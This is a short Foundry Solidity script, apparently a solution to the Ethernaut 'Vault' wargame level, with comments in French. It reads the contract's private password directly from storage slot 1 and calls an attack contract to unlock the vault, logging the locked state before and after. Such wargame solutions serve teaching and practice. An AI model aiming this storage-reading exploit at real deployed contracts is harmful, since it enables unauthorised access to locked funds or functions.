// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/AttackVault.sol"; // 1) add file

//@audit-info cast storage 0x07e34028F849b33cb4D5963a2e4E10DAcd7AE25C 1 --rpc-url $RPC_URL

contract SolveVault is Script { // 2) change contractName

    function run() external {

        address target = 0x07e34028F849b33cb4D5963a2e4E10DAcd7AE25C; // 3) add ethernaut instance address
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        bytes32 password = vm.load(target, bytes32(uint256(1))); // on recupere password depuis sotrage direrctement

        vm.startBroadcast(privateKey);

        console.log("Le locker avant est: ", IVault(target).locked());

        VaultAttack attacker = new VaultAttack();

        attacker.attack(target, password);

        console.log("Le locker apres est: ", IVault(target).locked());

        vm.stopBroadcast();

    }
}